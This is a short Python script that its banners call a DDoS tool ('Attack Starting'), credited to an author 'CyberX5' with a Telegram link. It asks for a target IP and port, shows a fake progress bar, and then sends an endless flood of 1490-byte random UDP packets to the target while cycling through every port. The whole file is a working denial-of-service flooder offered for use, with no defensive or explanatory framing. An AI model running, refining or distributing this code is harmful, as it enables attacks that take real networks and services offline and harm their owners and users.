import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

class bcolors:
    OKGREEN = '\033[92m'

os.system("clear")

banner = '''
     )     (    (                                    
  ( /(     )\ ) )\ )          (                      
  )\())   (()/((()/(          )\   (      )    (     
 ((_)\ ___ /(_))/(_))  (  (((((_)( )(    (     )\ )  
__ ((_)___(_))_(_))_   )\ )\)\ _ )(()\   )\  '(()/(  
\ \ / /    |   \|   \ ((_|(_|_)_\(_|(_)_((_))  )(_)) 
 \ V /     | |) | |) / _ (_-</ _ \| '_| '  \()| || | 
  |_|      |___/|___/\___/__/_/ \_\_| |_|_|_|  \_, | 
                                               |__/  
'''

print(bcolors.OKGREEN + banner)

print("Author   : CyberX5")
print("Telegram  : https://t.me/CyberX5")

ip = input("IP Target: ")
port = int(input("Port: "))

os.system("clear")

class bcolors:
    OKGREEN = '\033[92m'

os.system("clear")

banner = '''
                                 (                                    
   (        )   )            )   )\ )   )            )                
   )\    ( /(( /(   )     ( /(  (()/(( /(   ) (   ( /((        (  (   
((((_)(  )\())\()| /(  (  )\())  /(_))\()| /( )(  )\())\  (    )\))(  
 )\ _ )\(_))(_))/)(_)) )\((_)\  (_))(_))/)(_)|()\(_))((_) )\ )((_))\  
 (_)_\(_) |_| |_((_)_ ((_) |(_) / __| |_((_)_ ((_) |_ (_)_(_/( (()(_) 
  / _ \ |  _|  _/ _` / _|| / /  \__ \  _/ _` | '_|  _|| | ' \)) _` |  
 /_/ \_\ \__|\__\__,_\__||_\_\  |___/\__\__,_|_|  \__||_|_||_|\__, |  
                                                              |___/   
'''

print(bcolors.OKGREEN + banner)


print("[                    ] 0%")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s through port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1
